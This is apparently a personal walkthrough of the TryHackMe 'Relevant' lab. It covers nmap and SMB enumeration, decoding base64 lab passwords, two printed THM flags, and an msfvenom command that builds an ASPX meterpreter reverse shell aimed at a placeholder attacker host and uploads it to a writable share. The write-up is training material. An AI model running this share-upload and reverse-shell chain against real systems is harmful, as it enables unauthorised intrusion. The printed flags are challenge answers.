<h1>Relevant</h1>
<h3>December 24, 2024</h3>

<br>

<br>

https://tryhackme.com/r/room/relevant

<br>

<br>
nmap -sV relevant.thm<br>

![image](https://github.com/user-attachments/assets/2a462d84-3c4e-4fd6-8a67-156264f5c260)

<br>

nt4wrksv

<br>

smbclient -L \\relevant.thm<br>

![image](https://github.com/user-attachments/assets/40ed588d-5c1e-42aa-9e7c-ee670fdf999c)

<br>

smbclient -L \\\\relevant.thm\\nt4wrksv<br>

![image](https://github.com/user-attachments/assets/9bdc76d8-9135-44d8-86f0-76c8ebffad62)

<br>

ls<br>

cat passwords.txt<br>
[User Passwords - Encoded]<br>
Qm9iIC0gIVBAJCRXMHJEITEyMw==<br>
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk<br>

<br>


![image](https://github.com/user-attachments/assets/d407eec0-9d53-4552-8ed6-c4aec0cff47b)

<br>

echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d<br>
Bob - !P@$$W0rD!123r<br>

![image](https://github.com/user-attachments/assets/fe142f7d-3f9b-41ce-8dc0-51e10d487f71)









THM{fdk4ka34vk346ksxfr21tg789ktf45}<br>

THM{1fk5kf469devly1gl320zafgl345pv}

![image](https://github.com/user-attachments/assets/cd4976bb-8f65-4683-9861-cae9f311d288)

<br>

![image](https://github.com/user-attachments/assets/ecde9507-0634-482e-b550-c755ef856d0c)

<br>

echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d<br>
Bill - Juw4nnaM4n420696969!<br>

![image](https://github.com/user-attachments/assets/e7d0bebe-9d54-478f-9fde-b528fd2a16ba)

<br>
<br>
Bob:!P@$$W0rD!123r<br>
Bill:Juw4nnaM4n420696969!<br>

<p>The network share from ‘nt4wrksv’ is writeable</p>

<br>
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=[Attack VM] lport=[Attack Port] -f aspx -o shell.aspx


![image](https://github.com/user-attachments/assets/c26bbeaa-d518-48f5-8f71-53313d5b859a)

<br>
put shell.aspx<br>


![image](https://github.com/user-attachments/assets/d52eb73e-ecd2-45bf-b3fc-028b85538005)

<br>
msfupdate<br>
msfconsole<br>
msf6><br>





Global: 826th all time, 121st monthly
Brazil: 18th all time2nd monthly
493 completed rooms . 55 badges . 65,045 points
<br>

![image](https://github.com/user-attachments/assets/adf7bef1-49c7-4f4e-ba05-43049f890788)
